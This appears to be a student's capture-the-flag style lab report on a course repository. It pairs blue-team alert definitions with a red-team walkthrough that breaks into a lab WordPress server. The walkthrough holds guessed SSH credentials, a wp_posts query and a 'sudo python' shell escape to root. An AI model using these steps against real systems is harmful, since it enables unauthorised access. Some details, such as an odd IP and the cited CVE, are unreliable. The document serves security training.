# Final-Project
This is a private github repository meant to submit all of my findings and answers to the activities related to the Final Project.

# Blue Team: Summary of Operations

## Table of Contents
- Network Topology
- Description of Targets
- Monitoring the Targets
- Patterns of Traffic & Behavior
- Suggestions for Going Further

### Network Topology

The following machines were identified on the network:
- TARGET1
  - **Operating System**: Linux
  - **Purpose**: Runs Apache webserver 
  - **IP Address**:192.168.1.110
- TARGET2
  - **Operating System**: Linux
  - **Purpose**: Runs Apache webserver
  - **IP Address**:192.168.1.115
- Kali
  - **Operating System**: Linux
  - **Purpose**: Attacking Machine
  - **IP Address**: 192.168.1.90
- Capstone
  - **Operating System**: Linux
  - **Purpose**: Runs Apache webserver
  - **IP Address**: 192.168.1.105
- ELK
  - **Operating System**: Linux
  - **Purpose**: Runs Elasticsearch on the target machines.
  - **IP Address**: 19.168.1.100

### Description of Targets

The target of this attack was: `Target 1` 192.168.1.110.

Target 1 is an Apache web server and has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers. As such, the following alerts have been implemented:
- **Excessive HTTP Errors**: WHEN count() GROUPED OVER top 5 'http.response.status_code' IS ABOVE 400 FOR THE LAST 5 minutes
- **HTTP Request Size Monitor**: WHEN sum() of http.request.bytes OVER all documents IS ABOVE 3500 FOR THE LAST 1 minute
- **CPU Usage Monitor**: WHEN max() OF system.process.cpu.total.pct OVER all documents IS ABOVE 0.5 FOR THE LAST 5 minutes

### Monitoring the Targets

Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below:

#### Excessive HTTP Errors


Excessive HTTP Errors is implemented as follows:
  - **Metric**: http.response.status_code: Number of HTTP error codes (400 and up).
  - **Threshold**: Anything number of attempts that resulted in a 400 error code or above.
  - **Vulnerability Mitigated**: Brute Force Vulnerabilities could be mitigated with this alert. Any excessive amount of failed logins could clearly be brute force attempts into the network.
  - **Reliability**: This could cause some false negatives due to the error being set to trigger even one bad login attempt. However, it could prove valuable in monitoring overall failed attempts therefor making it difficult for successful brute force logins later on. I would rate this as medium reliability due to the sheer number of false alarms that would be created, however, it also does its job flawlessly in regards to alerting everytime a bad login is made, and in the process alerting for potential threat actor activity.

#### HTTP Request Size Monitor
HTTP Request Size Monitor is implemented as follows:
  - **Metric**: http.request.bytes: The amount of HTTP requests or rather the size of the requests in a set amount of time.
  - **Threshold**: Anything above 3500 events in the last 1 minute would trigger the alert
  - **Vulnerability Mitigated**: If there was a significant number of traffic that is directed towards a specific file on the webserver, that would alert the blue team of a potential malicious threat actor snooping around our file system trying to access confidential data.
  - **Reliability**: TODO: This could show a lot of false negatives if it just so happens to be a busy weekend and there is a lot of traffic flowing in and out of the webserver. However, on a regular basis, this would be reliable in that if there is an absurd amount of traffic being picked up by our web server at an unusual time especially, that tells me that something suspicious is likely occuring. I would rate this as highly reliable.

#### CPU Usage Monitor
CPU Usage Monitor is implemented as follows:
  - **Metric**: system.process.cpu.total.pct: CPU percentage use 
  - **Threshold**: Anything over .5% cpu being used on any file in the last 5 minutes.
  - **Vulnerability Mitigated**: This mitigates any issues with an excess amount of traffic or data flowing into a file which could prevent possible threat actors from tampering with files without getting caught.
  - **Reliability**: TODO: Normally I wouldn't expect file access and tampering to use up much CPU so I would rate this about medium reliability, this is because if something that is going to cause a significant amount of trouble is happening in our file system, I would expect higher CPU use than average. Only reason it isn't highly reliable is because sometimes hardware can effect how much CPU is being used, so if that hardware is outdated, it could potentially give you false negatives.



# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

![Command Output](https://github.com/Zatoid/Final-Project/blob/main/screenshots/nmap_scan_against_target_vm.PNG)

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22 SSH
  - Port 80 HTTP


The following vulnerabilities were identified on each target:
- Target 1
  - Wordpress vulnerability in which we input a wordpress command against the web server IP and enumerated the user info as well as their credentials.
  - Weak account credentials. We were able to easily guess Michaels account password which was just his name. Steven's password only took a few minutes to crack with John the Ripper.
  - Privilege escalation using a python script. This one I was able to find a CVE code on which is CVE-2006-0151. It has no official severity rating on nist.gov, however I would rate this as very severe. Escalating to root is the holy grail of all cyber attacks and to be able to do that from a user level with a simple python script is concerning.

![vulnerability scan 1](https://github.com/Zatoid/Final-Project/blob/main/screenshots/vuln_scan_1.PNG)
![vulnerability scan 2](https://github.com/Zatoid/Final-Project/blob/main/screenshots/vuln_scan_2.PNG)


### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
      - **Exploits**:
        - Brute forcing weak password credentials
        - Reading confidential files
      - **Commands**:
        - ssh michael@192.168.1.110 password: michael
        - cat /var/www/html/service.html

![flag 1](https://github.com/Zatoid/Final-Project/blob/main/screenshots/flag_1.PNG)

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - **Exploits**
        - Brute forcing weak password credentials
        - Reading confidential file
      - **Commands**
        - ssh michael@192.168.1.110 password: michael
        - cat /var/www/flag2.txt

![flag 2](https://github.com/Zatoid/Final-Project/blob/main/screenshots/flag_2.PNG)

  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - **Exploits**
        - Wordpress access due credentials being displayed in a publically accessible file.
      - **Commands**
        - Select * FROM wp_posts;

![flag 3](https://github.com/Zatoid/Final-Project/blob/main/screenshots/flag_3_and_4.PNG)

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - **Exploits**
        - Weak credentials
        - Wordpress access
      - **Commands**
        - ssh steven@192.168.1.110 password: pink84
        - sudo python -c 'import pty;pty.spawn("/bin/bash")'
        - cd /
        - find -iname *flag*
        - cat flag4.txt

![flag 4](https://github.com/Zatoid/Final-Project/blob/main/screenshots/flag_4.PNG)
